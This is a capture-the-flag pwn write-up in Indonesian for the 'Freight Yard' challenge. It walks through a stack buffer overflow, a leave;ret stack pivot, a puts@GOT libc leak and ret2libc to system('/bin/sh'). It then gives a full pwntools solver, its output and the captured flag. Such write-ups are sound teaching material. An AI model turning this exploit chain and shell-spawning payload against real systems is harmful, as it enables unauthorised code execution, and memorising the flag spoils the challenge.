# Writeup — Freight Yard

## Deskripsi Challenge

Challenge ini berada pada kategori **pwn** dengan judul **Freight Yard**.

Deskripsi challenge:

```text
The Dolos freight yard runs a terminal for overnight dock crews to stage cargo before dispatch. The schedule is tight, but one careless label is all it takes to reroute the whole shipment.
```

Kita diberikan beberapa file:

```text
freight_yard
ld-linux-x86-64.so.2
libc.so.6
```

File `freight_yard` adalah binary utama, sedangkan `libc.so.6` dan `ld-linux-x86-64.so.2` adalah library yang digunakan oleh service remote. Ini penting karena exploit membutuhkan alamat fungsi libc yang sesuai dengan environment remote.

---

## Analisis Awal

Saat binary dijalankan, program menampilkan menu:

```text
=== Dolos Freight Yard ===
Manage your cargo bays before dispatch.

[1] Load cargo into bay
[2] Inspect bay
[3] List bays
[4] Dispatch shipment
[5] Quit
>
```

Dari hasil reverse engineering, program memiliki beberapa fungsi utama:

```text
cmd_load
cmd_inspect
cmd_list
cmd_dispatch
```

Menu utama memanggil fungsi berdasarkan pilihan user. Pilihan `1` memanggil `cmd_load`, pilihan `2` memanggil `cmd_inspect`, pilihan `3` memanggil `cmd_list`, dan pilihan `4` memanggil `cmd_dispatch`.

---

## Fitur Load Cargo

Fungsi `cmd_load()` dipakai untuk memasukkan data ke salah satu bay. Program menyediakan 4 bay, yaitu bay `0` sampai bay `3`.

Pada fungsi ini, user memilih bay, lalu program membaca maksimal `0x40` atau 64 byte ke alamat global `bays`.

Potongan penting dari disassembly:

```asm
0x00401399      mov esi, 0x40
...
0x004013be      lea rax, obj.bays
...
0x004013c8      mov edx, 0x40
0x004013d0      mov edi, 0
0x004013d5      call sym.imp.read
```

Artinya setiap bay dapat menyimpan 64 byte data. Karena `bays` berada di `.bss`, area ini bisa kita pakai untuk menyimpan ROP chain.

Symbol penting dari binary:

```text
__gadgets     = 0x4011a6
__pivot_stack = 0x4040a0
bays          = 0x4060a0
bay_used      = 0x4061a0
```

Area `bays` dan `__pivot_stack` sangat mencurigakan karena berada di `.bss` dan dapat digunakan untuk stack pivot.

---

## Vulnerability

Bug utama terdapat pada fungsi `cmd_dispatch()`.

Disassembly fungsi tersebut:

```asm
0x004015dc      push rbp
0x004015dd      mov rbp, rsp
0x004015e0      sub rsp, 0x20
...
0x004015f3      lea rax, [buf]
0x004015f7      mov edx, 0x38
0x004015ff      mov edi, 0
0x00401604      call sym.imp.read
...
0x00401619      leave
0x0040161a      ret
```

Buffer lokal hanya berada di `rbp-0x20`, berarti ukurannya 32 byte. Namun program membaca `0x38` atau 56 byte.

Stack layout-nya:

```text
[ buffer 0x20 byte ]
[ saved RBP 8 byte ]
[ saved RIP 8 byte ]
[ extra 8 byte ]
```

Karena `read()` menerima 56 byte, kita bisa menimpa:

```text
saved RBP
saved RIP
```

Jadi vulnerability-nya adalah **stack buffer overflow** pada fitur dispatch.

---

## Kenapa Tidak Langsung Ret2libc?

Overflow di `cmd_dispatch()` hanya memberi ruang kecil:

```text
0x38 byte
```

Setelah 32 byte buffer dan 8 byte saved RBP, kita hanya punya 16 byte tersisa untuk saved RIP dan sedikit data tambahan.

Ruang ini tidak cukup untuk ROP chain lengkap seperti:

```text
pop rdi ; ret
"/bin/sh"
system
```

Karena itu exploit perlu menggunakan **stack pivot**.

---

## Gadget

Binary menyediakan fungsi lokal bernama `__gadgets`. Dari hasil analisis, gadget yang tersedia adalah:

```asm
0x4011a6: pop rdi ; ret
0x4011a8: pop rsi ; ret
0x4011aa: pop rdx ; ret
```

Awalnya sempat diasumsikan bahwa ada gadget:

```asm
pop rsp ; ret
```

di alamat `0x4011ac`, tetapi setelah dicek ulang, alamat tersebut bukan `pop rsp ; ret`. Isinya adalah:

```asm
nop
ud2
```

Jadi jika kita lompat ke `0x4011ac`, program akan crash. Karena tidak ada `pop rsp ; ret`, stack pivot dilakukan menggunakan teknik:

```asm
leave ; ret
```

Alamat `leave ; ret` yang dipakai berasal dari epilog `cmd_dispatch()`:

```text
0x401619: leave
0x40161a: ret
```

---

## Konsep Stack Pivot

Instruksi:

```asm
leave
ret
```

secara sederhana melakukan:

```asm
mov rsp, rbp
pop rbp
ret
```

Karena overflow dapat menimpa saved `RBP`, kita bisa mengatur saved `RBP` agar menunjuk ke area `.bss`, misalnya ke `bays`.

Payload dispatch:

```python
payload  = b"A" * 0x20
payload += p64(BAYS)
payload += p64(LEAVE_RET)
payload  = payload.ljust(0x38, b"B")
```

Saat fungsi `cmd_dispatch()` selesai, program mengeksekusi `leave; ret`.

Alurnya menjadi:

```text
RBP dikontrol menjadi BAYS
RIP diarahkan ke leave; ret
leave; ret membuat RSP pindah ke BAYS
ROP chain berjalan dari BAYS
```

---

## Stage 1: Leak Libc

Karena binary menggunakan libc dinamis, kita perlu leak alamat libc. Tujuannya adalah menghitung base address libc saat runtime.

Pada percobaan awal, leak dilakukan terhadap:

```text
write@GOT
```

Namun hasil base libc tidak page-aligned:

```text
libc base = ...7010
```

Base libc normalnya harus berakhir dengan `000`. Ini menunjukkan perhitungan base meleset. Karena itu leak diganti ke:

```text
puts@GOT
```

`puts()` sudah dipanggil beberapa kali oleh program, sehingga GOT entry-nya sudah ter-resolve. Leak `puts@GOT` menghasilkan base libc yang benar dan page-aligned:

```text
puts leak = 0x7f9adcb85980
libc base = 0x7f9adcb0e000
```

ROP stage 1:

```python
stage1 = flat(
    0,

    POP_RDI, 1,
    POP_RSI, elf.got["puts"],
    POP_RDX, 8,
    elf.plt["write"],

    POP_RDI, 0,
    POP_RSI, PIVOT,
    POP_RDX, STAGE2_LEN,
    elf.plt["read"],

    POP_RBP, PIVOT,
    LEAVE_RET,
)
```

Stage 1 melakukan tiga hal:

```text
1. write(1, puts@got, 8) untuk leak libc
2. read(0, PIVOT, STAGE2_LEN) untuk menerima ROP stage 2
3. pivot lagi ke PIVOT menggunakan leave; ret
```

---

## Stage 2: system("/bin/sh") atau system("cat flag")

Setelah libc base didapat, alamat `system()` dan string `/bin/sh` dapat dihitung:

```python
libc.address = puts_leak - libc.sym["puts"]

system = libc.sym["system"]
binsh = next(libc.search(b"/bin/sh\x00"))
```

Stage 2:

```python
stage2 = flat(
    0,
    RET,
    POP_RDI,
    binsh,
    system,
)
```

Gadget `RET` ditambahkan untuk stack alignment agar pemanggilan `system()` stabil.

Setelah shell didapat, command berikut dikirim:

```bash
cat flag.txt 2>/dev/null; cat /flag 2>/dev/null; printenv FLAG 2>/dev/null
```

---

## Solver Final

```python
#!/usr/bin/env python3
from pwn import *

HOST = "tcp-01kyyqtyyjz9wr78rt1zp6jt7j.u-ctf-ctf-7001b39a.urc.tf"
PORT = 443

context.binary = elf = ELF("./freight_yard", checksec=False)
libc = ELF("./libc.so.6", checksec=False)

POP_RDI = 0x4011a6
POP_RSI = 0x4011a8
POP_RDX = 0x4011aa
POP_RBP = 0x40118d
LEAVE_RET = 0x401619
RET = 0x4011a7

BAYS = elf.sym["bays"]
PIVOT = elf.sym["__pivot_stack"] + 0x1f60
BAY_SIZE = 0x40
STAGE2_LEN = 0x28


def choose(io, n):
    io.sendlineafter(b"> ", str(n).encode())


def load_bay(io, idx, data):
    assert len(data) <= BAY_SIZE

    choose(io, 1)
    io.sendlineafter(b"Bay number [0-3]: ", str(idx).encode())
    io.recvuntil(b"Cargo (")
    io.recvuntil(b": ")

    io.send(data.ljust(BAY_SIZE, b"\x00"))


def dispatch_pivot(io, rbp_target):
    choose(io, 4)
    io.recvuntil(b"Enter shipping label for dispatch:\n")

    payload = b"A" * 0x20
    payload += p64(rbp_target)
    payload += p64(LEAVE_RET)
    payload = payload.ljust(0x38, b"B")

    io.send(payload)
    io.recvuntil(b"Shipment dispatched.\n")


def main():
    io = remote(HOST, PORT, ssl=True, sni=HOST)

    stage1 = flat(
        0,

        POP_RDI, 1,
        POP_RSI, elf.got["puts"],
        POP_RDX, 8,
        elf.plt["write"],

        POP_RDI, 0,
        POP_RSI, PIVOT,
        POP_RDX, STAGE2_LEN,
        elf.plt["read"],

        POP_RBP, PIVOT,
        LEAVE_RET,
    )

    for i in range(3):
        load_bay(io, i, stage1[i * BAY_SIZE:(i + 1) * BAY_SIZE])

    dispatch_pivot(io, BAYS)

    puts_leak = u64(io.recvn(8))
    libc.address = puts_leak - libc.sym["puts"]

    log.success(f"puts leak = {puts_leak:#x}")
    log.success(f"libc base = {libc.address:#x}")

    stage2 = flat(
        0,
        RET,
        POP_RDI,
        next(libc.search(b"/bin/sh\x00")),
        libc.sym["system"],
    )

    io.send(stage2)
    io.sendline(b"cat flag.txt 2>/dev/null; cat /flag 2>/dev/null; printenv FLAG 2>/dev/null")

    print(io.recvall(timeout=3).decode(errors="ignore"))


if __name__ == "__main__":
    main()
```

---

## Output

Saat exploit dijalankan:

```text
[*] bays      = 0x4060a0
[*] pivot     = 0x406000
[*] leave_ret = 0x401619
[+] Opening connection to tcp-01kyyqtyyjz9wr78rt1zp6jt7j.u-ctf-ctf-7001b39a.urc.tf on port 443: Done
[*] stage1 length = 144
[+] puts leak = 0x7f9adcb85980
[+] libc base  = 0x7f9adcb0e000
uctf{019989013122e40f4d1f88bb1bd4d23e3ef7}
```

---

## Flag

```text
uctf{019989013122e40f4d1f88bb1bd4d23e3ef7}
```

---

